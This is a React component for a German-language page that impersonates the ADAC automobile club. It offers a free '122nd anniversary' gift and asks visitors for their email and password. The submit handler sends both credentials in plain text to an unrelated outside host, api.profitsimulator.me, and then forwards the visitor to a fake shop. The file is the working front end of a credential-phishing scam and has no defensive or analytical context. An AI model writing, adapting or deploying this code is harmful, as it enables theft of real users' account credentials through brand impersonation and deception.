import { useState, useCallback, memo } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { Gift, Check, Truck, Star, Shield } from "lucide-react";
import LoadingScreen from "./LoadingScreen";

const AnniversaryCardOptimized = memo(() => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;

    setIsLoading(true);
    
    try {
      const response = await fetch('https://api.profitsimulator.me/ADAC/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        // Store email in localStorage for shop page
        localStorage.setItem('userEmail', email);
        // Navigate to shop
        navigate('/shop');
      } else {
        console.error('Login failed');
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Network error:', error);
      setIsLoading(false);
    }
  }, [email, password, navigate]);

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <Card className="w-full professional-card border-0">
      <CardContent className="p-6 sm:p-8 lg:p-10 text-center">
        <div className="mb-8">
          <div className="inline-flex items-center justify-center p-3 bg-adac-orange/10 rounded-2xl mb-6">
            <Gift className="w-6 h-6 sm:w-7 sm:h-7 text-adac-orange" />
          </div>
          <h2 className="font-display text-xl sm:text-2xl lg:text-3xl font-bold text-adac-orange leading-tight mb-6">
            Exklusives Jubiläums-Geschenk für Sie!
          </h2>
          
          <p className="text-sm sm:text-base lg:text-lg text-card-foreground leading-relaxed mb-8 px-2 max-w-2xl mx-auto">
            Anlässlich unseres 122. Jubiläums möchten wir uns bei unseren treuen Kunden bedanken. 
            Als Zeichen unserer Wertschätzung haben Sie die Möglichkeit, ein kostenloses Geschenk 
            aus unserer exklusiven Auswahl zu wählen.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6 mb-8">
          <div className="space-y-3 text-left">
            <Label htmlFor="email" className="text-sm font-semibold text-card-foreground uppercase tracking-wide flex items-center gap-2">
              <Shield className="w-4 h-4 text-adac-orange" />
              E-Mail-Adresse *
            </Label>
            <Input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="h-12 sm:h-14 px-4 border-2 border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-adac-orange focus:border-adac-orange transition-all duration-200 bg-white text-gray-900 text-base font-medium"
              placeholder="ihre.email@beispiel.de"
              required
            />
          </div>

          <div className="space-y-3 text-left">
            <Label htmlFor="password" className="text-sm font-semibold text-card-foreground uppercase tracking-wide flex items-center gap-2">
              <Shield className="w-4 h-4 text-adac-orange" />
              Passwort *
            </Label>
            <Input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-12 sm:h-14 px-4 border-2 border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-adac-orange focus:border-adac-orange transition-all duration-200 bg-white text-gray-900 text-base font-medium"
              placeholder="Ihr sicheres Passwort"
              required
            />
          </div>

          <Button 
            type="submit" 
            disabled={isLoading}
            className="w-full gift-button text-white font-bold py-4 sm:py-5 h-14 sm:h-16 rounded-xl flex items-center justify-center text-base sm:text-lg shadow-xl hover:shadow-2xl transition-all duration-300 mt-8 disabled:opacity-50"
          >
            <Gift className="w-5 h-5 sm:w-6 sm:h-6 mr-3" />
            Zu meinen Geschenken
          </Button>
        </form>

        <div className="grid grid-cols-3 gap-4 sm:gap-6 pt-6 sm:pt-8 border-t border-gray-100">
          <div className="flex flex-col items-center group">
            <div className="bg-green-50 p-3 sm:p-4 rounded-2xl mb-3 group-hover:bg-green-100 transition-colors">
              <Check className="w-5 h-5 sm:w-6 sm:h-6 text-green-600" />
            </div>
            <span className="text-sm sm:text-base font-bold text-card-foreground">100%</span>
            <span className="text-xs sm:text-sm text-muted-foreground font-medium">Kostenlos</span>
          </div>
          
          <div className="flex flex-col items-center group">
            <div className="bg-blue-50 p-3 sm:p-4 rounded-2xl mb-3 group-hover:bg-blue-100 transition-colors">
              <Truck className="w-5 h-5 sm:w-6 sm:h-6 text-blue-600" />
            </div>
            <span className="text-sm sm:text-base font-bold text-card-foreground">Kostenloser</span>
            <span className="text-xs sm:text-sm text-muted-foreground font-medium">Versand</span>
          </div>
          
          <div className="flex flex-col items-center group">
            <div className="bg-red-50 p-3 sm:p-4 rounded-2xl mb-3 group-hover:bg-red-100 transition-colors">
              <Star className="w-5 h-5 sm:w-6 sm:h-6 text-red-600" />
            </div>
            <span className="text-sm sm:text-base font-bold text-card-foreground">Exklusive</span>
            <span className="text-xs sm:text-sm text-muted-foreground font-medium">Auswahl</span>
          </div>
        </div>
      </CardContent>
    </Card>
  );
});

AnniversaryCardOptimized.displayName = 'AnniversaryCardOptimized';

export default AnniversaryCardOptimized;